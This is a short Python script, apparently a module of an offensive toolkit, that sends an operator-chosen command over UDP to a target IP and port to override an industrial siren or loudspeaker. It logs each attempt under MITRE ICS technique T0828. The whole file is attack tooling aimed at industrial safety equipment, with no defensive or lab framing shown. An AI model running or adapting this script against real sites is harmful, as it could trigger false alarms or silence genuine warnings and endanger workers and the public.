#!/usr/bin/env python3
# modules/attacks/industrial_siren_override.py

import argparse
import socket
import json
import time
from datetime import datetime
import os

LOG_PATH = "results/siren_override_log.json"
MITRE_TTP = "T0828"

def log_action(ip, port, payload, success):
    os.makedirs("results", exist_ok=True)
    log_entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "target_ip": ip,
        "target_port": port,
        "payload": payload,
        "success": success,
        "ttp": MITRE_TTP
    }
    with open(LOG_PATH, "a") as f:
        f.write(json.dumps(log_entry) + "\n")

def override_siren(ip, port, command):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(3)
        s.sendto(command.encode(), (ip, port))
        s.close()
        log_action(ip, port, command, True)
        print(f"[+] Siren command sent to {ip}:{port}")
    except Exception as e:
        log_action(ip, port, command, False)
        print(f"[!] Failed to send siren override: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Override industrial siren or loudspeaker via UDP broadcast")
    parser.add_argument("--ip", required=True, help="Target IP address")
    parser.add_argument("--port", type=int, default=5000, help="Target port (default: 5000)")
    parser.add_argument("--cmd", required=True, help="Command to play or stop the siren")
    args = parser.parse_args()

    override_siren(args.ip, args.port, args.cmd)
